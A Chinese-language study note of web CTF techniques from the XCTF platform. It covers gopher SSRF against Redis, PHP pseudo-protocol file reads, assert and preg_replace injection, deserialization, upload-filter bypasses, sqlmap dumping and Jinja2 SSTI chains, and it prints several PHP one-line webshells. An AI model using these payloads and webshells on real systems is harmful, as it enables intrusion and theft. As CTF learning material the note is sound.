web note 1 - CTF
===

总结了一些攻防世界 web CTF 题的思路:

## 发包结构

伪造源地址, 加在包的头部即可

```
GET /target HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
X-Forwarded-For: 8.8.8.8      # 添加在这里
Referer: https://www.google.com/  # 添加在这里
Cookie: session=abc123
```

## SSRF: Gopher 协议

Gopher 是早期互联网协议（1990年代），用于分发、搜索和检索文档。它支持多种请求类型（如文件、目录、索引搜索等）。Gopher 协议常被用作 SSRF（Server-Side Request Forgery，服务端请求伪造）攻击的手段:

协议格式：Gopher 请求是一个单行文本，格式为：

```
<资源类型><选择器字符串>\t<主机名>\t<端口>\r\n

# 例如：1/exploit%0d%0aCOMMAND\tlocalhost\t6379\r\n（攻击 Redis）
```

> 注意: 支持多行输入（通过 `%0d%0a` 注入换行符）。
> 允许直接构造任意 TCP 数据包（包括 HTTP、FTP、Redis 等协议的命令）。

某些后端过滤中会禁止: `http://` 或 `file://` 协议，但常忽略陈旧的 `gopher://`。

示例攻击 Redis:

```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$5%0d%0aKEY%0d%0a$5%0d%0aVALUE%0d%0a
```

此请求会向本机 Redis 发送 `SET KEY VALUE`。

- 为什么选择 Gopher?
  - Gopher 协议本身无身份验证，攻击者可直接构造请求访问敏感服务。内网服务（如 Redis、Memcached）通常使用明文协议，Gopher 可完美适配其命令格式。通过 `%0d%0a`（换行符）构造多行命令，模拟其他协议（如 HTTP POST 提交表单）。

### 防御:

协议白名单: 即禁用 gopher 协议;
输入校验: 过滤用户输入的 URL 中的特殊字符（如 `%0d%0a`）。
网络隔离(域渗透): 限制服务器访问内网的权限（防火墙策略、VPC 隔离）
服务加固: 为内网服务（Redis/Memcached）启用认证并限制绑定 IP。

## 编码

### URL 编码

![url_encode.png](url_encode.png)

## PHP

### PHP_RCE : MVC 框架

版本:
ThinkPHP 5.0系列 < 5.0.23
ThinkPHP 5.1系列 < 5.1.31

mvc 的效果听起来和反代是类似的, 不过 MVC 的效果是在站内, 当用户访问站点内某目录文件时, MVC 会使用映射, 将路径显示为另一个 (非常概括的说法)

严格一点来说:
- 模型（Model）：负责存储系统的中心数据。
- 视图（View）：将信息显示给用户（可以定义多个视图）。
- 控制器（Controller）：处理用户输入的信息。负责从视图读取数据，控制用户输入，并向模型发送数据，是应用程序中处理用户交互的部分。负责管理与用户交互交互控制。

　　视图和控制器共同构成了用户接口。
　　且每个视图都有一个相关的控制器组件。控制器接受输入，通常作为将鼠标移动、鼠标按钮的活动或键盘输入编码的时间。时间被翻译成模型或试图的服务器请求。用户仅仅通过控制器与系统交互。

![1.png](1.png)

这个 MVC 中的路由技术在现代 JavaScript 前端框架中不仅被沿用，还成了核心标配, 变得更加强大了。比如 js 网站中的路径可以是完全虚拟的

回到 Thinkphp 5.0 RCE 漏洞上, 如果在这个版本的 MVC 网站中, 选择的不是强制模式, 而是混合模式, 由于该版本缺少对 $ 等字符的过滤, 会导致 RCE 代码注入

完整复现:[CSDN博客](https://blog.csdn.net/mochu7777777/article/details/104842420)

### .php 和 .phps

`.phps` 是 php 文件源码的意思, 

1. `.php` 文件（标准 PHP 文件）

- 服务器行为：

  PHP 解释器执行文件中的代码, 将执行结果（HTML/文本等）发送给客户端

- 客户端看到：

```html
<!-- 执行结果 -->
<h1>Hello World</h1>
```

- 典型路径：https://example.com/login.php

2. `.phps` 文件（PHP Source 文件）

- 服务器行为：

  不执行 PHP 代码, 直接将源代码以语法高亮形式输出
 
- 客户端看到：

```php
<?php
// 带颜色的源代码
echo "<h1>Hello World</h1>";
?>
```
- 典型路径：https://example.com/login.phps


另外, url 大部分时候主要是编码和解码, 但是有些网站会使用加密, 注意区别, 以及 % 等特殊符号可能需要多次加密或者转义


### 一句话木马:

```php
<?php @eval($_POST['shell']);?>
```

### PHP 伪协议

总结: [CSDN 博客](https://segmentfault.com/a/1190000018991087)

伪协议最经典的应用场景是 文件读取, 更精确的来说是文件包含。(include)

#### php://filter 伪协议

`php://filter` 用于在读取或写入数据时对数据流进行过滤处理，语法格式为：

```
php://filter/[读|写模式]/resource=目标资源
```

一般来说:
```
php://filter/read=convert.base64-encode/resource=
```

为什么要进行编码? 因为这样代码将变得不可执行, 如果直接原样返回, 假设目标是一串可执行代码, 如 php, 将返回代码结果而不是源码本身


用过的姿势:
```
# base64 编码
GET /?filename=php://filter/convert.base64-encode/resource=check.php HTTP/1.1

# rot13 编码
GET /?filename=php://filter/read=string.rot13/resource=./check.php HTTP/1.1

# 转小写
GET /?filename=php://filter/read=string.tolower/resource=./check.php HTTP/1.1

# 去除 html/php 标签
GET /?filename=php://filter/read=string.strip_tags/resource=./check.php HTTP/1.1

# 将数据转换为 quoted-printable 格式
GET /?filename=php://filter/read=convert.quoted-printable-encode/resource=./check.php HTTP/1.1

# 字符集从 UTF-8 转换到 ISO-8859-1 (还可以是utf-32等)
GET /?filename=php://filter/read=convert.iconv.utf-8/iso-8859-1/resource=./check.php 
```

绕过姿势:
1. `read=` 字符是可以省略的, 绕过 `read` 过滤

#### data:// 伪协议

```
data://<MIME类型>;[选项],<数据内容>
```
MIME 类型：如 text/plain、application/php 等，指定数据的类型。
选项：常用 base64 表示数据已进行 Base64 编码。
数据内容：直接嵌入的文本数据或 Base64 编码后的数据。

例如:
```php
<?php include('data://text/plain;base64,PD9waHAgc3lzdGVtKCd1bmFtZSAtYScpOyA/Pg=='); ?>
```
解码后:
```php
<?php system('uname -a'); ?>
```

再例如, 使用 data:// 伪协议来传参:

```
c=data://text/plain;base64,eyJtIjoiMjAyNWEiLCJuIjp7IjIwMjVhIjpbMSwxXSwiREdHSiI6MX19
```

#### php://input 协议

这是一个关键协议, 是非常常用的攻击对象, 如果执行了这个协议, 那么服务器会直接执行 body  正文表单中的 php 代码, 而这个代码可以含有系统指令, 例如:

```
http://223.112.5.141:62276/?page=PHP://input
```

表单:
```php
<?php
system("ls")
?>
```

并且这个请求不论是 POST 还是 GET 都可以发送, 一般来说会用带请求体的 GET 方法 (不规范但合法, 被php解析)

#### php函数

PHP 手册: [官网](https://www.php.net/manual/zh/)

```php
strstr(
    string $haystack, 
    string $needle, 
    bool $before_needle = false
    ): string|false
```
搜索一个字符串中某个子字符串的首次出现位置, 参数:
- `haystack`: 输入字符串。
- `needle`: 搜索字符串
- `before_needle`: 默认为 `false`, 为 `true` 返回该子字符串 (`needle`) 前面的字符串, 否则返回其 (含本身) 后的所有字符串。



```php
str_replace(
    array|string $search,
    array|string $replace,
    string|array $subject,
    int &$count = null
): string|array`
```

该函数返回字符串或者数组。该字符串或数组是将 `subject` 中全部的 `search` 都被 `replace` 替换之后的结果。

- `search`
  查找的目标值，也就是 needle。一个数组可以指定多个目标。

- `replace`
  search 的替换值。一个数组可以被用来指定多重替换。

- `subject` 
  执行替换的数组或者字符串。也就是 `haystack`。如果 `subject` 是一个数组，替换操作将遍历整个 `subject`，返回值也将是一个数组。

- `count`
  如果被指定，它的值将被设置为替换发生的次数。

如果 `search` 和 `replace` 都是数组, 那么他们的替换关系将会一一对应

```php
str_rot13(string $string): string
```

对 string 做 ROT13 变换, 也就是将其中的字母前移(或后移, 无所谓, 因为一共26个字母,整好移动一半) 13位。


```php
assert() 
```

这个函数可以直接解析并执行里面的 php 指令, 此处存在注入:

`assert("strpos('$file', '..') === false")`
payload:
`abc') or system("cat templates/flag.php");//`


正则匹配替换函数:
```
preg_replace(
    string|array $pattern,
    string|array $replacement,
    string|array $subject,
    int $limit = -1,
    int &$count = null
): string|array|null
```

在 $str 中搜索 $pat, 替换为 $replacement

- `$pattern` 模式字符串
- `$replacement` 替换字符串
- `$subject` 被搜索字符串

漏洞: 
这个函数有个 “/e” 漏洞，“/e” 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码进行执行。如果这么做要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。

比如: 
```url
pat=/abc/e&rep=system('ls')&sub=abc
```
(/e 并不是什么意外执行, 而是早期php 设计者为了方便用户开发设计出来的特性)

#### 题外话: 为什么 eval() 这么厉害?

eval() 和 system() 都极可能导致 RCE, 不同点在于 system() 是执行系统指令, 这会受制于操作系统, 而 eval() 是 **php语言构造器**, 灵活程度高得多, 只要服务器上有 php, 几乎可以无视操作系统执行任意指令, 从蓝队视角来说, eval() 是需要永远禁用的。

### PHP 常用绕过手法:

- 大小写绕过:

例如 `PHP://` 来绕过对 `php://` 的过滤

- 数字方面:
  
  - 科学计数法绕过: 例如 `$a ="6e7"` 可以在不超过三位的情况下完成 `$a > 10000` 的校验 

- 编码方面:

  unicode 编码: 某些网站只是简单的做了编码绕过, unicode有效,
  例如 `"` -> `\u0022`

### PHP 反序列化:

#### 魔法函数的具体调用时机:

- `__wakeup()`: 当对象被反序列化

即 `unserialize()` 时调用。

- `__construct()`: 对象被构造的时候调用:

例如, `$a = new person()` 调用

- `__destruct()`: 对象被销毁时调用:

脚本执行完毕, 或者 `$a = null`, 或者 `unset($a)`

#### 不同属性序列化后的格式长度:

来源: [CSDN 博客](https://blog.csdn.net/qq_41617034/article/details/104573548)

`public` 属性被序列化的时候属性值会变成 `属性名`
`protected` 属性被序列化的时候属性值会变成 `\x00` `*` `\x00` `属性名` 
`private` 属性被序列化的时候属性值会变成`\x00` `类名` `\x00` `属性名`

这道题非常有代表性, payload 为

`?var=TzorNDoiRGVtbyI6MTp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==`

当序列化结果自相矛盾时, __wakeup() 不会执行, 可以用这个方法来绕过

#### 反 php 正则表达式过滤

`preg_match()` 的一个漏洞，假设目前过滤了 `.php` 等文件后缀, 那么在正则匹配结束后会转义unicode，把传入参数 unicode 编码再 url 编码即可绕过, 

此外, 对linux 系统, 如果服务端是用的这种过滤:

```php
if(preg_match('/.+\.ph(p[3457]?|t|tml)/i', $filename)) {
    die("禁止上传PHP文件！");
}
```

那么只要上传 `.php/.` 后缀即可, 因为 linux 服务器会截断最后的 `/.`, 最后文件还是会以 `.php` 的形式保存在服务器上, 而正则表达式中, 由于最后一个 `.` 被放在了最后, 会导致匹配失败, 被放行。

## 公式枚举

### SQLMAP 公式注入

用 SQLMAP 前应该先尝试手动注入

先找到一个搜索框, 随便输入个值, 然后抓包保存到 a.txt

```bash
sqlmap -r a.txt -dbs
```

接下来参照这个例子, 按从外到内, 从库到表, 到字段的方式渗透数据库

```bash
sqlmap -r xctfrequest.txt -D news --tables
sqlmap -r xctfrequest.txt -D news -T secret_table  --columns
sqlmap -r xctfrequest.txt -D news -T secret_table -C "id,fl4g" --dump
```

## 攻防世界 题解

#### web2

关键代码

```python
maze = "~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg"

def decode_maze(maze):
    decoder = []
    for i in range(len(maze)-1, -1, -1):
        decoder.append(chr(ord(maze[i]) - 1))
    return ''.join(decoder)

print(decode_maze(maze))  
''' 原函数
function encode($str){
    $_o=strrev($str); //逆序 $str
    for($_0=0;$_0<strlen($_o);$_0++){ //顺序
        $_c=substr($_o,$_0,1); // $_c=$_o[$_O], 取末尾字符
        $__=ord($_c)+1;  
        $_c=chr($__); //$_c=chr(ord($_c)+1), 编码自增
        $_=$_.$_c;   //把$_c拼接到末尾
    } 
    return str_rot13(strrev(base64_encode($_)));
}  
// 加密:
// ROT13(right)编码 <-  逆序 <- base64编码
// 逆算:
// ROT13(left)解码 -> 逆序 -> base64解码 
'''
```

### Flask 伪造 session

[csdn](https://www.haoyun.website/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/)

### 文件包含:

`/proc/self/cmdline` 当前运行的进程参数行命令

### 文件上传处可能存在的 SQL 注入:

原理很好理解, 上传之后的文件如果存在预览, 特别是文件名, 就有可能有注入: 可以设想语句:

`insert into 表名('filename',...) values('你上传的文件名',...);`

参考: [cnblogs](https://www.cnblogs.com/Dozeer/p/10953036.html)

## Python

### flask 注入

> [flask基础](https://www.freebuf.com/column/187845.html)

1. 确认是否有注入

尝试 payload = `{{2*2}}`

如果结果被算出来了, 说明其中的命令已被执行

2. 确认沙箱

Flask 默认有沙箱, 测试沙箱环境:

```
{{ config }}  # 尝试访问 Flask 应用配置
{{ self }}    # 尝试访问模板上下文
```

如果返回有效结果, 那么说明沙箱已经被绕过了
否则要想办法绕沙箱

3. 调用魔术方法来寻找利用点
  
利用点的思路:

```
对象实例（如 "hello"）
  ↳ __class__              # 返回类对象 <class 'str'>
       ↳ __mro__           # 返回继承链元组 (<class 'str'>, <class 'object'>)
            ↳ [1]          # 索引 1 是 object 类
                 ↳ __subclasses__()  # 返回所有子类列表
                      ↳ [40]         # 假设索引 40 是 file 类
                           ↳ __init__          # file 类的构造函数
                                ↳ __globals__   # 全局命名空间
                                     ↳ 'open'   # 文件操作函数
                                     ↳ 'os'     # OS 模块
```

`__class__`  返回类型所属的对象
`__mro__`    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
`__base__`   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的

`__subclasses__()`   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
`__init__`  类的初始化方法
`__globals__`  对包含函数全局变量的字典的引用

最经典的利用:
(XCTF - Web_python_template_injection)

`''.__class__.__mro__` 查看继承链

`''.__class__.__mro__[2].__subclasses__()` 找到父类的所有子类, 然后锁定到其中的 file 类型进行文件读取

`''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()` 读出 `/etc/passwd`

同理, 找到其中的 `site._Printer` 类型, 这个可以执行命令:

`''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')` 读出当前目录

最终 payload = `{{''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()}}` 

### flask 框架基础

flask 框架的主要文件: `app.py`

#### flask session 伪造

参考: [csdn](https://blog.csdn.net/2302_79800344/article/details/137391400)

flask session 伪造需要用到私钥, `serect_key`; `serect_key`的值可通过内存数据获取，在读取内存数据文件(`proc/self/mem`)之前，我们需要知道哪些内存是可以读写的，这就需要我们先通过`proc/self/maps`获取可读内容的映射地址:

### SSTI 注入 (RCE 高危, 常见的 Python 漏洞)

系统的认识 SSTI 注入:

是一种利用 Web 应用程序的模板渲染机制执行恶意代码的安全漏洞

前面这两种利用均是 SSTI

其原理是将恶意模板语法注入服务端模板中:

Web 应用常使用模板引擎（如 Jinja2、Thymeleaf、Freemarker）动态生成 HTML。例如：

#### Flask (Python) + Jinja 渲染

```python
# Flask + Jinja2 示例
from flask import render_template_string
name = request.args.get('name')
output = render_template_string(f"Hello, {name}!")  # 用户输入直接拼接到模板
```
正常输入：name=Alice → 渲染 Hello, Alice!

恶意输入：name={{7*7}} → 渲染 Hello, 49!（执行了计算）

{{7*'7'}} -> 49 -> twig

{{7*'7'}} -> 7777777 -> jinjia2

#### Flask 沙箱逃逸

如果服务器对 read(), subclass() 等关键方法做了过滤, 但是没有过滤 request(), 那么就可以利用黑名单做沙箱逃逸:

`request` 是 Flask 框架的一个全局对象 , 表示 "当前请求的对象(flask.request) " 。

所以我们可以利用 **request.args + GET传参**绕过输入黑名单，进行沙箱逃逸。其实就是闯过重重黑名单，最终拿到系统命令执行权限的过程。

payload: `{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?&a=__class__&b=__mro__&c=__subclasses__&d=read`

其实就是吧之前的 payload 用 request 的方式重构了

#### 快速判断框架

payload = `{{7*7}}` 判断是否有注入

payload = `{{7*'7'}}`, 结果若为 `'7777777'` 则说明一定为 jinja2 或者 Twig 引擎 (这是他们的特性)

#### Tornado

Tornado 模板允许执行任意 Python 表达式（比 Jinja2 更开放）：Tornado 无内置沙箱，模板中可直接调用 `__import__`、`open` 等危险函数

#### 常见绕过:

思路: [CSDN](https://blog.csdn.net/qq_33020901/article/details/83036927)

- 不需要 `()` 直接读取 `self`  `config` 的payload:
 `{{ url_for.__globals__['current_app'].config}}`

- `request` + GET 传参绕过黑名单沙箱逃逸: `{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?&a=__class__&b=__mro__&c=__subclasses__&d=read`

- 无过滤无沙箱的情况下: `''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()` 读出 `/etc/passwd`

## Misc

### 文件上传绕过

#### perl (.pl) 漏洞

原理: perl文件遇到上传可配合ARGV文件使用造成任意文件读取或者任意命令执行(管道符)
(XCTF i-got-id-200)

我们猜测后台逻辑大概是这样的。

```perl
use strict; use warnings; use CGI;

my $cgi= CGI->new; if ( $cgi->upload( 'file' ) ) { my $file= $cgi->param(
'file' ); while ( <$file> ) { print "$_"; } } 
```
3.那么，这里就存在一个可以利用的地方，param()函数会返回 一个列表的文件 但是 只有第一个文件会被放入到下面的file变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。

4.在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，可以实现读取任意文件。

5.那么到了这里，可以有两种方法处理：第一种，直接猜出flag文件/flag；

6.第二种，通过管道的方式，执行任意命令，然后将其输出结果用管道传输到读入流中，这样就可以保证获取到flag文件的位置了。这里用到了${IFS}来作命令分割，原理是会将结果变成bash -c "ls/"的等价形式。最后得到flagFLAG{p3rl_6_iz_EVEN_BETTER!!1}

#### 一句话木马

常用一句话木马:
```php
GIF89a
<?=@eval($_POST['shell']);?>
```

你需要知道:
`<?= expr ?>` ＝ `<?php echo expr; ?>`

1. 抓包, 把 `Content-Type:` 改为 `image/jpg`
2.  改后缀, 改文件头, 例如 jpg 的文件头 :`GIF89a`
3.  windows 空格绕过: 原理是windows系统不允许最后一个字符是空格, 会自动去掉
4.  (PHP>=5.3)利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有 `?.php` 可执行文件。所以本题我们要想上传并且执行，首先上传.user.ini文件，然后上传一个图片。
   
    来源:[csdn](https://blog.csdn.net/yuanxu8877/article/details/128071631)

    原理是.user.ini中会指定在同目录上传的其他 php 文件末尾都会 include 其中配置的指定文件, 比如这里就可以是 shell.jpg , (可能 .user.ini 本身设计的初衷是一个无管理员的为共享主机环境下的用户自定义需求)利用这个方式完成webshell (php解析)的上传. 

    .user.ini 一共 include 两个选项: auto_prepend_file和auto_append_file, 一个在前面一个在后面

    这个利用本质上是一个借刀杀人的过程, 只要服务器在该路径尝试加载并解析任何php源文件, 就会连同上传的 webshell 一起触发

#### 变种的一句话木马

首先可做php解析的文件后缀: php3, php5, php7, pht,phtml 等

以及这种表达方式:

```html
<script language="php">
    <?=@eval($_POST['shell']);?>
</script>
```

